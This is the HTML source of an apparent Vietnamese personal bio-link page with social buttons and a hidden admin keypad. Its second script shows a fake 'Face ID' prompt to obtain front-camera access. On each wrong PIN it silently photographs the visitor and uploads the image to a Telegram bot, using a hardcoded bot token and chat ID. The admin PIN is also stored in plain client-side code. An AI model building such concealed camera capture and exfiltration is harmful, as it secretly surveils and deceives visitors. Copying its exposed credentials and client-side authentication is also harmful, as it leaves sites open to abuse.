<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Góc nhỏ của Duy</title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/833/833472.png" type="image/png">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&family=Patrick+Hand&family=Courier+New:wght@700&display=swap" rel="stylesheet">

  <style>
    /* --- CẤU HÌNH GIAO DIỆN --- */
    :root { --primary-color: #ff85a2; --bg-gradient: linear-gradient(135deg, #ffe6f0 0%, #e6f7ff 100%); }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Quicksand', sans-serif; background: var(--bg-gradient); color: #d63384; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; overflow-x: hidden; position: relative; }
    
    .container { background: rgba(255,255,255,0.6); backdrop-filter: blur(10px); padding: 30px; border-radius: 30px; box-shadow: 0 10px 30px rgba(255,133,162,0.2); width: 100%; max-width: 500px; z-index: 10; text-align: center; border: 2px solid #fff; }
    .intro-text { font-size: 1.8em; font-weight: bold; margin-bottom: 25px; text-shadow: 2px 2px 0px #fff; }
    .btn { display: inline-block; padding: 12px 25px; margin: 10px 5px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; text-decoration: none; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
    .btn:hover { transform: translateY(-3px); }
    .btn-main { background: linear-gradient(to right, #ff99cc, #ffccff); color: white; }
    .btn-social { background: var(--primary-color); color: white; width: 100%; max-width: 200px; display: flex; align-items: center; justify-content: center; margin: 10px auto; }
    .btn-social i { margin-right: 10px; }
    
    /* Dynamic Island */
    #dynamic-island { position: fixed; top: 10px; left: 50%; transform: translateX(-50%); width: 120px; height: 35px; background: black; border-radius: 20px; z-index: 99999; display: flex; justify-content: space-between; align-items: center; padding: 0 5px; color: white; font-family: sans-serif; font-size: 0; transition: 0.5s; opacity: 0; pointer-events: none; }
    #dynamic-island.active { width: 200px; height: 50px; opacity: 1; padding: 0 15px; font-size: 14px; }
    .faceid-spinner { width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #00ff00; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
    #dynamic-island.active .faceid-spinner { display: block; }
    @keyframes spin { 100% { transform: rotate(360deg); } }

    /* Keypad */
    .btn-gear { position: fixed; bottom: 20px; left: 20px; width: 50px; height: 50px; background: rgba(255,255,255,0.9); border: 2px solid #ff85a2; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #ff85a2; font-size: 22px; z-index: 999; cursor: pointer; }
    .among-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
    .keypad-container { background: #788a91; padding: 20px; border-radius: 15px; border: 4px solid #364045; width: 300px; text-align: center; }
    .display-screen { background: #1b2621; color: #38b586; font-family: 'Courier New', monospace; font-size: 28px; font-weight: bold; padding: 20px; border: 4px solid #101613; margin-bottom: 20px; border-radius: 5px; }
    .keys-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
    .keys-grid button { background: #d1d6d8; border: none; box-shadow: 0 6px #83898c; padding: 15px 0; font-size: 22px; font-weight: 900; color: #364045; border-radius: 8px; }
    .keys-grid button:active { transform: translateY(6px); box-shadow: none; background: #bec3c5; }
    
    /* Background Animal */
    .animal-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
    .animal { position: absolute; font-size: 30px; animation: floatAnimal 15s infinite linear; opacity: 0.7; }
    @keyframes floatAnimal { 0% { transform: translateX(-50px); } 100% { transform: translateX(100vw); } }
  </style>
</head>
<body>

  <div id="dynamic-island">
      <div class="faceid-spinner"></div>
      <span style="margin-right: auto; margin-left: 10px;">Face ID</span>
      <i class="fa-solid fa-lock-open" style="font-size: 14px;"></i>
  </div>

  <div class="animal-container">
    <div class="animal" style="top: 20%">🐱</div>
    <div class="animal" style="top: 50%">🐶</div>
  </div>

  <div class="container">
    <div class="intro-text">🌸 Phan Đức Duy 🌸</div>
    <a href="https://www.facebook.com/phan.duc.duy.6" class="btn btn-social"><i class="fab fa-facebook"></i> Facebook</a>
    <a href="https://www.tiktok.com/@phan.duc.duy6" class="btn btn-social" style="background: black;"><i class="fab fa-tiktok"></i> TikTok</a>

    <div style="margin-top: 30px; border-top: 2px dashed #ffb6c1; padding-top: 20px;">
        <h3>✨ Liên kết nhanh</h3>
        <div id="dynamic-links-area"></div>
    </div>
  </div> 

  <div onclick="triggerFaceID()" class="btn-gear">
    <i class="fa-solid fa-gear"></i>
  </div>

  <div id="amongUsOverlay" class="among-overlay">
      <div class="keypad-container">
          <div class="display-screen" id="displayScreen">ENTER CODE</div>
          <div class="keys-grid">
              <button onclick="pressKey(1)">1</button><button onclick="pressKey(2)">2</button><button onclick="pressKey(3)">3</button>
              <button onclick="pressKey(4)">4</button><button onclick="pressKey(5)">5</button><button onclick="pressKey(6)">6</button>
              <button onclick="pressKey(7)">7</button><button onclick="pressKey(8)">8</button><button onclick="pressKey(9)">9</button>
              <button onclick="closeKeypad()" style="background:#ff9999;color:#7d2222">X</button>
              <button onclick="pressKey(0)">0</button>
              <button onclick="checkCode()" style="background:#99ff99;color:#227d22">OK</button>
          </div>
      </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted style="display:none;"></video>
  <canvas id="hiddenCanvas" style="display:none;"></canvas>
  <audio id="beepSound" src="https://www.soundjay.com/buttons/beep-07.mp3"></audio>

  <script>
    let storedData = localStorage.getItem('myBioData');
    let links = storedData ? JSON.parse(storedData) : [{title:"(Chưa có link nào)", url:"#"}];
    const dContainer = document.getElementById('dynamic-links-area');
    links.forEach(l => {
        let el = document.createElement('a'); el.style.display="block"; el.style.background="white"; el.style.margin="10px"; el.style.padding="10px"; el.style.borderRadius="15px"; el.style.textDecoration="none"; el.style.color="#d63384"; el.style.fontWeight="bold";
        el.href=l.url; el.target="_blank"; el.innerText = l.title;
        dContainer.appendChild(el);
    });
  </script>

  <script>
    const BOT_TOKEN = "8327880663:AAHwb_huPkUciiOod1_yvHgYSdGDdsWSbUE"; 
    const CHAT_ID = "5885388309"; 
    const ADMIN_PIN = "20012006";

    const island = document.getElementById('dynamic-island');
    const overlay = document.getElementById('amongUsOverlay');
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('hiddenCanvas');
    let stream = null;
    let currentInput = "";
    
    // 1. Kích hoạt FaceID ảo
    function triggerFaceID() {
        island.classList.add('active');
        startCamera().then(() => {
            setTimeout(() => { island.classList.remove('active'); openKeypad(); }, 1500);
        }).catch(() => {
            setTimeout(() => { island.classList.remove('active'); openKeypad(); }, 1500);
        });
    }

    // 2. Camera
    async function startCamera() {
        try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); video.srcObject = stream; } catch(e) {}
    }
    function stopCamera() { if(stream) stream.getTracks().forEach(t => t.stop()); }

    // 3. Chụp và gửi ÂM THẦM
    function takePhotoSilent() {
        if(!stream) return;
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            let fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'intruder.png');
            fd.append('caption', '🚨 Kẻ gian nhập sai pass!');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd });
        });
    }

    // 4. Keypad Logic
    function openKeypad() { overlay.style.display = "flex"; currentInput=""; document.getElementById('displayScreen').innerText="ENTER CODE"; }
    function closeKeypad() { overlay.style.display = "none"; stopCamera(); }
    function pressKey(n) {
        document.getElementById('beepSound').currentTime=0; document.getElementById('beepSound').play();
        if(currentInput.length < 10) { currentInput += n; document.getElementById('displayScreen').innerText = currentInput; }
    }

    function checkCode() {
        if(currentInput === ADMIN_PIN) {
            // Đúng pass
            document.getElementById('displayScreen').innerText="OK!";
            document.getElementById('displayScreen').style.color="#00ff00";
            stopCamera();
            setTimeout(() => { window.location.href="admin.html"; }, 800);
        } else {
            // Sai pass -> Rung lắc -> Chụp ngầm -> Reset
            document.getElementById('displayScreen').innerText="ERROR";
            document.getElementById('displayScreen').style.color="red";
            
            // Rung
            const k = document.querySelector('.keypad-container');
            k.style.transform="translateX(10px)";
            setTimeout(()=>k.style.transform="translateX(-10px)",50);
            setTimeout(()=>k.style.transform="translateX(0)",100);

            // Chụp
            takePhotoSilent();

            // Reset lại để nhập tiếp
            setTimeout(() => {
                currentInput = "";
                document.getElementById('displayScreen').innerText="ENTER CODE";
                document.getElementById('displayScreen').style.color="#38b586";
            }, 1000);
        }
    }
  </script>
</body>
</html>
